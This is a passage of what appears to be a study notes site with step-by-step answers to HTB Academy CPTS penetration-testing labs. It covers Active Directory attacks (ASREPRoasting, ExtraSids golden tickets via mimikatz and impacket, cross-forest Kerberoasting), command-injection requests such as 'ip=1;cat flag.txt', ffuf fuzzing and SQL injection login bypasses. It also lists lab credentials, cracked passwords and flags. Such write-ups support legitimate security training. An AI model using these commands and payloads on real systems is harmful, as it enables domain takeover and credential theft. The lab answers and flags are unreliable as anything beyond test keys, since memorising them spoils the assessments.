D0ntSl@ckonN0P@c!</p> <p>RDP to\u00a0\u00a0(ACADEMY-EA-MS01)\u00a0,10.129.32.8\u00a0(ACADEMY-EA-ATTACK01)\u00a0with user \"htb-student\" and password \"Academy_student_AD!\". Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter \"y\".</p> <pre><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol\n</code></pre> <p>Results: ygroce</p> <p>Find another user with the \"Do not require Kerberos pre-authentication setting\" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.</p> <pre><code># Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser\nImport-Module .\\PowerView.ps1\nGet-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl\n\n# Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.\n.\\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat\n\n# Cracking the Hash Offline with Hashcat:\nhashcat -m 18200 ygroce /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Results: Pass@word</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#why-so-trusting","title":"Why So Trusting?","text":"<p>RDP to\u00a0\u00a0with user \"htb-student\" and password \"Academy_student_AD!\". What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)</p> <pre><code>Import-Module activedirectory\nGet-ADTrust -Filter *\n</code></pre> <p>Results: LOGISTICS.INLANEFREIGHT.LOCAL,</p> <p>What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?</p> <pre><code># Same as above\nImport-Module activedirectory\nGet-ADTrust -Filter *\n</code></pre> <p>Results: FREIGHTLOGISTICS.LOCAL</p> <p>What direction is this trust?</p> <p>Results: Bidirectional</p> <p>RDP to\u00a0\u00a0with user \"htb-student_adm\" and password \"HTB_@cademy_stdnt_admin!\". What is the SID of the child domain?</p> <pre><code># As we are already in the child domain:\nImport-Module .\\PowerView.ps1\nGet-DomainSID\n</code></pre> <p>Results: S-1-5-21-2806153819-209893948-922872689</p> <p>What is the SID of the Enterprise Admins group in the root domain?</p> <pre><code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n</code></pre> <p>Results: S-1-5-21-3842939050-3880317879-2865463114-519</p> <p>Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.</p> <pre><code># The complete attack would require getting the golden tickets.\n# Step 1: get SID of the Child domain\nImport-Module .\\PowerView.ps1\nGet-DomainSID\n# Result: S-1-5-21-2806153819-209893948-922872689\n\n\n# Step 2: get  KRBTGT hash for the child domain\n# Go to mimikatz.exe file in the explorer and execute as admin\nlsadump::dcsync /user:$domain\\$user\n# Result:  `9d765b482771505cbe97411065964d5f`.\n\n# Step 3: getting the name of a target user in the child domain (does not need to exist!)\n# Result: hacker\n\n# Step 4: getting the FQDN of the child domain. \n# Listed above in mimikatz output\n# Result:  `LOGISTICS.INLANEFREIGHT.LOCAL`\n\n# Step 5: getting the SID of the Enterprise Admins group of the root domain\n# Way #1:\nGet-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n# Way #2:\nGet-ADGroup -Identity \"Enterprise Admins\" -Server \"INLANEFREIGHT.LOCAL\"\n# Result:  `S-1-5-21-3842939050-3880317879-2865463114-519`\n\n# Step 6: the attack\n# Generate a golden ticket:\nkerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt\n# Read the flag (make sure that the ticket has been created with klist)\ncat \\\\academy-ea-dc01.inlanefreight.local\\c$\\ExtraSids\\flag.txt\n</code></pre> <p>Results: f@ll1ng_l1k3_d0m1no3$</p> <p>SSH to\u00a0with user \"htb-student\" and password \"HTB_@cademy_stdnt!\". Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.</p> <pre><code>#### Step 1: getting the KRBTGT hash for the child domain\nsecretsdump.py $targetedDomain/$UserWithAdminPriv@$TargetedIP -just-dc-user $NetbiosNameofDomain/krbtgt\n\n# Example:\n# secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt\n# Enter password: HTB_@cademy_stdnt_admin!\n# Results: 9d765b482771505cbe97411065964d5f\n#### \n\n#### Step 2: getting the SID for the child domain. Obtain the SID for the domain and the RIDs for each user and group and filter out by Domain SID\nlookupsid.py $targetedDomain/$UserWithAdminPriv@TargetedIP | grep \"Domain SID\"\n\n# Example:\n# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep \"Domain SID\"\n# Enter password: HTB_@cademy_stdnt_admin!\n# Results:  S-1-5-21-2806153819-209893948-922872689\n####\n\n#### Step 3: getting the name of a target user in the child domain (does not need to exist!)\nhacker\n####\n\n#### Step 4: getting the FQDN of the child domain.\nlogistics.inlanefreight.local\n####\n\n#### Step 5: getting the SID of the Enterprise Admins group of the root domain\nlookupsid.py $targetedDomain/$UserWithAdminPriv@$DomainControllerIP | grep \"Enterprise Admins\"\n# Example:\n# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep \"Enterprise Admins\"\n# Enter password: HTB_@cademy_stdnt_admin!\n# Results: 519: INLANEFREIGHT\\Enterprise Admins (SidTypeGroup)\n####\n\n#### Step 6: Generate a golden ticket \nticketer.py -nthash $KRBTGThashOfChildDomain -domain $targetedDomain -domain-sid $sidDomain -extra-sid $SIDofEnterpriseAdminGroup $madeupUserName\n# Example:\n# ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker\n\n# The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials:\n[*] Saving ticket in hacker.ccache\n\n# Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.\nexport KRB5CCNAME=hacker.ccache \n####\n\n#### Step 7: Accessing another user on domain\n# With one user, we will request the NTLM hash for another user\nsecretsdump.py $ControlledUsername@$hostnameController.$Parentdomain -k -no-pass -just-dc-ntlm -just-dc-user $targetUsername\n# Example:\n# secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross\n</code></pre> <p>Results: 49a074a39dd0651f647e765c2cc794c7</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#breaking-down-boundaries","title":"Breaking Down Boundaries","text":"<p>Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.</p> <pre><code>#### Enumerating SPNs\nGet-DomainUser -SPN -Domain $TargetDomain | select SamAccountName\n# Example:\n# Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName\n# Results: mssqlsvc\n######\n\n#### Getting which groups is mssqlsvc member of\nGet-DomainUser -Domain $TargetDomain -Identity $interestingUserSamAccountName | select samaccountname,memberof\n# Example:\n# Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof\n# Results:  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL\n######\n\n#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag\n.\\Rubeus.exe kerberoast /domain:$TargetDomain /user:$interestingUserSamAccountName /nowrap\n# Example: \n# .\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap\n# Results: [the kerberos ticket]\n####\n\n#### Crack it\nhashcat -m 13100 ticketTocrack /usr/share/wordlists/rockyou.txt \n</code></pre> <p>Results: 1logistics</p> <p>Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.</p> <pre><code>GetUserSPNs.py -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName\n# Example:\n# GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley\n# Enter password: transporter@4\n</code></pre> <p>Results: sapsso</p> <p>Crack the TGS and submit the cleartext password as your answer.</p> <pre><code>GetUserSPNs.py -request -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName\n# Example:\n# GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley\n# Enter password: transporter@4\n\n# Cracking the sapsso TGS:\nhashcat -m 13100 sapsso /usr/share/wordlists/rockyou.txt  \n</code></pre> <p>Results: pabloPICASSO</p> <p>Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.</p> <pre><code>evil-winrm -i 172.16.5.238 -u sapsso -p pabloPICASSO\ncat c:\\Users\\Administrator\\Desktop\\flag.txt\n</code></pre> <p>Results: burn1ng_d0wn_th3_f0rest!</p> <p>Question</p> <pre><code>\n</code></pre> <p>Results:</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#using-web-proxies","title":"Using Web Proxies","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#intercepting-web-requests","title":"Intercepting Web Requests","text":"<p>Try intercepting the ping request on the server shown above, and change the post data similarly to what we did in this section. Change the command to read 'flag.txt'</p> <pre><code># After intercepting the request, we enter:\nPOST /ping HTTP/1.1\nHost: 94.237.59.24:51204\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 17\nOrigin: http://94.237.59.24:51204\nConnection: close\nReferer: http://94.237.59.24:51204/\nUpgrade-Insecure-Requests: 1\n\nip=1;cat flag.txt\n</code></pre> <p>The response:</p> <pre><code>HTTP/1.1 200 OK\nX-Powered-By: Express\nDate: Sun, 20 Oct 2024 18:17:29 GMT\nConnection: close\nContent-Length: 282\n\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms\nHTB{1n73rc3p73d_1n_7h3_m1ddl3}\n</code></pre> <p>Results: HTB{1n73rc3p73d_1n_7h3_m1ddl3}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#repeating-requests","title":"Repeating Requests","text":"<p>Try using request repeating to be able to quickly test commands. With that, try looking for the other flag.</p> <p>The request:</p> <pre><code>POST /ping HTTP/1.1\nHost: 94.237.59.24:51204\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 18\nOrigin: http://94.237.59.24:51204\nConnection: close\nReferer: http://94.237.59.24:51204/\nUpgrade-Insecure-Requests: 1\n\nip=1;cat /flag.txt\n</code></pre> <p>The response:</p> <pre><code>HTTP/1.1 200 OK\nX-Powered-By: Express\nDate: Sun, 20 Oct 2024 18:37:28 GMT\nConnection: close\nContent-Length: 283\n\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms\nHTB{qu1ckly_r3p3471n6_r3qu3575}\n</code></pre> <p>Results: HTB{qu1ckly_r3p3471n6_r3qu3575}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#encodingdecoding","title":"Encoding/Decoding","text":"<p>Question. </p> <pre><code># The provided file contains the text:\nVTJ4U1VrNUZjRlZXVkVKTFZrWkdOVk5zVW10aFZYQlZWRmh3UzFaR2NITlRiRkphWld0d1ZWUllaRXRXUm10M1UyeFNUbVZGY0ZWWGJYaExWa1V3ZVZOc1VsZGlWWEJWVjIxNFMxWkZNVFJUYkZKaFlrVndWVmR0YUV0V1JUQjNVMnhTYTJGM1BUMD0=\n\n# It is base64 text. You need to decode in base64 4 times until getting an url encoded. First:\ncat encoded_flag.txt | base64 -d | tee encoded2.txt\n# U2xSUk5FcFVWVEJLVkZGNVNsUmthVXBVVFhwS1ZGcHNTbFJaZWtwVVRYZEtWRmt3U2xSTmVFcFVXbXhLVkUweVNsUldiVXBVV214S1ZFMTRTbFJhYkVwVVdtaEtWRTB3U2xSa2F3PT0=\n\ncat encoded2.txt | base64 -d | tee encoded3.txt\n# SlRRNEpUVTBKVFF5SlRkaUpUTXpKVFpsSlRZekpUTXdKVFkwSlRNeEpUWmxKVE0ySlRWbUpUWmxKVE14SlRabEpUWmhKVE0wSlRkaw==\n\ncat encoded3.txt | base64 -d | tee encoded4.txt\n# JTQ4JTU0JTQyJTdiJTMzJTZlJTYzJTMwJTY0JTMxJTZlJTM2JTVmJTZlJTMxJTZlJTZhJTM0JTdk\n\ncat encoded4.txt | base64 -d | tee encoded5.txt\n# %48%54%42%7b%33%6e%63%30%64%31%6e%36%5f%6e%31%6e%6a%34%7d\n\n# Enter it in Decoder in Burpsuite \nHTB{3nc0d1n6_n1nj4}\n</code></pre> <p>Results: HTB{3nc0d1n6_n1nj4}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#proxying-tools","title":"Proxying Tools","text":"<p>Question.  <pre><code># Start metasploit\nmsfconsole -q\n\n# Then, to set a proxy for any exploit within Metasploitwith the `set PROXIES`\u00a0flag. \nset PROXIES HTTP:127.0.0.1:8080\n\nuse auxiliary/scanner/http/http_put\n\nset RHOSTS https://academy.hackthebox.com/\n\nrun\n</code></pre></p> <p>Results: msf test file</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#burp-intruder","title":"Burp Intruder","text":"<p>Use Burp Intruder to fuzz for '.html' files under the /admin directory, to find a file containing the flag.</p> <p>This is the request</p> <pre><code>GET /admin/\u00a7flag\u00a7.html HTTP/1.1\nHost: 94.237.59.246:39867\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: close\nUpgrade-Insecure-Requests: 1\n</code></pre> <p>In Burp Intruder set a Snipper attack. Use common.txt as payload. Run it and payload 2010 will return the flag.</p> <p>Results: HTB{burp_1n7rud3r_fuzz3r!}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#zap-fuzzer","title":"ZAP Fuzzer","text":"<p>The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the \"top-usernames-shortlist.txt\" wordlist from Seclists.</p> <p>Results: HTB{fuzz1n6_my_f1r57_c00k13}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#zap-scanner","title":"ZAP Scanner","text":"<p>Run ZAP Scanner on the target above to identify directories and potential vulnerabilities. Once you find the high-level vulnerability, try to use it to read the flag at '/flag.txt'. </p> <p>The vulnerable endpoint contains a command injection vulnerability. This is the request: </p> <pre><code>GET /devtools/ping.php?ip=|+cat+/flag.txt HTTP/1.1\nHost: 94.237.54.253:52356\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: close\nReferer: http://94.237.54.253:52356/index.php/2021/08/11/customer-support/\nUpgrade-Insecure-Requests: 1\n</code></pre> <p>And this is the response:</p> <pre><code>HTTP/1.1 200 OK\nDate: Tue, 22 Oct 2024 16:54:31 GMT\nServer: Apache/2.4.41 (Ubuntu)\nVary: Accept-Encoding\nContent-Length: 156\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n&lt;!DOCTYPE html&gt;\n\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;title&gt;Ping&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n  HTB{5c4nn3r5_f1nd_vuln5_w3_m155}\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> <p>Results: HTB{5c4nn3r5_f1nd_vuln5_w3_m155}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#skills-assessment-using-web-proxies","title":"Skills Assessment - Using Web Proxies","text":"<p>The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.. </p> <pre><code># Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/lucky.php and remove in source code \"disabled=\"\"\". Then click on the button. You will get a POST request to lucky.php in your intercepted traffic. Send it to Repeater module. Click on Send. Within the response, you will see:\n&lt;p style=\"text-align:center\"&gt;HTB{d154bl3d_bu770n5_w0n7_570p_m3}&lt;/p&gt;\n</code></pre> <p>Results: HTB{d154bl3d_bu770n5_w0n7_570p_m3}</p> <p>The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.. </p> <pre><code>#  Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/admin.php. See the \"Set-Cookie: cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d\"\n\n# Use Decoder. First, decode as ASCII hex, you will get:\nM2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==\n\n# Use Decoder. Second, decode as Base64, you will get:\n3dac93b8cd250aa8c1a36fffc79a17a\n</code></pre> <p>Results: 3dac93b8cd250aa8c1a36fffc79a17a</p> <p>Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the \"alphanum-case.txt\" wordlist from Seclist for the payload). </p> <p></p> <p></p> <p>Results:            HTB{burp_1n7rud3r_n1nj4!}</p> <p>You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?. </p> <pre><code>msfconsole -q\nuse auxiliary/scanner/http/coldfusion_locale_traversal\noptions\nset RHOSTS $ip\nset RPORT $port\nset PROXIES HTTP:127.0.0.1:8080\n\n# Go to Burpsuite and check out the request\nGET /CFIDE/administrator/index.cfm HTTP/1.1\nHost: 94.237.62.154:37883\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0\nConnection: close\n</code></pre> <p>Results: CFIDE</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#attacking-web-applications-with-ffuf","title":"Attacking Web Applications with Ffuf","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#basic-fuzzing","title":"Basic Fuzzing","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#directory-fuzzing","title":"Directory fuzzing","text":"<p>In addition to the directory we found above, there is another directory that can be found. What is it?</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -u http://$ip:$port/FUZZ\n</code></pre> <p>Results: forum</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#page-fuzzing","title":"Page fuzzing","text":"<p>Try to use what you learned in this section to fuzz the '/blog' directory and find all pages. One of them should contain a flag. What is the flag?.</p> <pre><code># Find the extension in use\nffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://$ip:$port/blog/indexFUZZ\n\n# As it is php, we will fuzz now possible existent files.php \nffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$ip:$port/blog/FUZZ.php\n\n# We obtain http://$ip:$port/blog/home.php\n</code></pre> <p>Results: HTB{bru73_f0r_c0mm0n_p455w0rd5}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#recursive-fuzzing","title":"Recursive fuzzing","text":"<p>Try to repeat what you learned so far to find more files/directories. One of them should give you a flag. What is the content of the flag?.</p> <pre><code>ffuf  -recursion -recursion-depth 1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://$ip:$port/FUZZ -e .php \n\n### We obtain http://$ip:$port/forum/flag.php and the flag is there. \n</code></pre> <p>Results: HTB{fuzz1n6_7h3_w3b!}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#domain-fuzzing","title":"Domain Fuzzing","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#subdomain-fuzzing","title":"Subdomain fuzzing","text":"<p>Try running a sub-domain fuzzing test on 'inlanefreight.com' to find a customer sub-domain portal. What is the full domain of it?.</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.inlanefreight.com/\n</code></pre> <p>Results: customer.inlanefreight.com</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#filtering-results","title":"Filtering results","text":"<p>Try running a VHost fuzzing scan on 'academy.htb', and see what other VHosts you get. What other VHosts did you get?.</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:$port -H 'Host: FUZZ.academy.htb' -fs 986\n</code></pre> <p>Results: test.academy.htb</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#parameter-fuzzing","title":"Parameter fuzzing","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#parameter-fuzzing-get","title":"Parameter fuzzing - GET","text":"<p>Using what you learned in this section, run a parameter fuzzing scan on this page. what is the parameter accepted by this webpage?.</p> <pre><code># We enumerate:\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:$por/admin/admin.php?FUZZ=key -fs 798\n\n# And we obtain user. We enter http://admin.academy.htb:30721/admin/admin.php?user=key and obtain the message, You don't have access to read the flag. We enter http://admin.academy.htb:30721/admin/admin.php?user=admin and obtain the message \"This method is deprecated\"\n\nffuf -w  /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:$port/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx\n</code></pre> <p>Results: user</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#value-fuzzing","title":"Value  fuzzing","text":"<p>Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing scan, and then use it in a 'POST' request with 'curl' to collect the flag. What is the content of the flag?.</p> <pre><code># First create a list of 1000 id values, from 1 to 1000\nfor i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done\n# Now, fuzz\nffuf -w ids.txt:FUZZ -u http://admin.academy.htb:$port/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx\n# it will return the payload 73. Now with curl:\ncurl http://admin.academy.htb:$port/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded' \n</code></pre> <p>Results: HTB{p4r4m373r_fuzz1n6_15_k3y!}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#skills-assessment-web-fuzzing","title":"Skills assessment - Web fuzzing","text":"<p>Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name).</p> <pre><code>ffuf -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:$port/ -H 'Host: FUZZ.academy.htb' -fs 985\n</code></pre> <p>Results: test archive faculty</p> <p>Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?.</p> <pre><code>ffuf -w  /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:$port/indexFUZZ -H 'Host:test.academy.htb'\nffuf -w  /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:$port/indexFUZZ -H 'Host:archive.academy.htb'\nffuf -w  /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:$port/indexFUZZ -H 'Host:faculty.academy.htb'\n</code></pre> <p>Results: php phps php7</p> <p>**\u00a0One of the pages you will identify should say 'You don't have access!'. What is the full page URL?.**</p> <pre><code>ffuf -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://faculty.academy.htb:$port/FUZZ  -recursion -recursion-depth 1 -e .php,.php7,.phps -fc 403\n</code></pre> <p>Results:  http://faculty.academy.htb:PORT/courses/linux-security.php7</p> <p>**\u00a0In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?.**</p> <pre><code># First, we fuzz parameters:\nffuf -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://faculty.academy.htb:$port/courses/linux-security.php7?FUZZ=1   -fs 774\n\n# We obtain user. We enter http://faculty.academy.htb:$port/courses/linux-security.php7?user=admin in the browsers. When accessing, we read the message \"This method is no longer used.\" printed on the screen. So we try to FUZZ the value of the user parameter with the POST method\nffuf -w  /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ  -u \"http://faculty.academy.htb:$port/courses/linux-security.php7\"  -X POST -d \"FUZZ=key\" -H 'Content-Type: application/x-www-form-urlencoded'  -fs 774 \n</code></pre> <p>Results:  user, username</p> <p>Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?.</p> <pre><code>ffuf -w  /usr/share/seclists/Usernames/Names/names.txt:FUZZ  -u \"http://faculty.academy.htb:$port/courses/linux-security.php7\"  -X POST -d \"username=FUZZ\" -H 'Content-Type: application/x-www-form-urlencoded'  -fs 781\n\n# This returns 'harry'. Now we curl that url\ncurl  \"http://faculty.academy.htb:$port/courses/linux-security.php7\"  -X POST -d \"username=harry\"  \n</code></pre> <p>Results:  HTB{w3b_fuzz1n6_m4573r}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#login-brute-forcing","title":"Login Brute Forcing","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#sql-injection-fundamentals","title":"SQL Injection Fundamentals","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#mysql_1","title":"MySQL","text":"<p>Authenticate to\u00a083.136.255.194:55762\u00a0with user \"root\" and password \"password\" Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?</p> <pre><code>mysql -u root -h $ip -P $port -ppassword\nshow databases;\n</code></pre> <p>Results: employees</p> <p>What is the department number for the 'Development' department?</p> <pre><code>mysql -u root -h $ip -P $port -ppassword\nshow databases;\nshow tables;\nselect * from departments;\n</code></pre> <p>Results: d005</p> <p>What is the last name of the employee whose first name starts with \"Bar\" AND who was hired on 1990-01-01?</p> <pre><code>mysql -u root -h $ip -P $port -ppassword\nshow databases;\nshow tables;\nselect * from employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';\n</code></pre> <p>Results: Mitchem</p> <p>In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?</p> <pre><code>mysql -u root -h $ip -P $port -ppassword\nSELECT * from titles WHERE (emp_no &gt; 10000 OR title NOT LIKE 'Engineer');\n</code></pre> <p>Results: 654</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#sql-injections","title":"SQL Injections","text":"<p>Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?</p> <pre><code># Username\ntom' OR '1'='1\n\n# Password\nlala\n</code></pre> <p>Results:  202a1d1a8b195d5e9a57e434cc16000c</p> <p>Login as the user with the id 5 to get the flag.</p> <pre><code># Username\n' or id=5)#\n# Leave password empty\n</code></pre> <p>Results:  cdad9ecdf6f14b45ff5c4de32909caec</p> <p>Authenticate to\u00a0<code>$ip:$port</code>\u00a0with user \"root\" and password \"password\". Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.</p> <pre><code>mysql -u root -h $ip -P $port -ppassword\n\nshow databases;\nuse employees;\ndescribe employees;\ndescribe departments;\nSELECT dept_no,dept_name,NULL,NULL,NULL,NULL from departments UNION select * FROM employees;\n</code></pre> <p>Results: 663</p> <p>Use a Union injection to get the result of 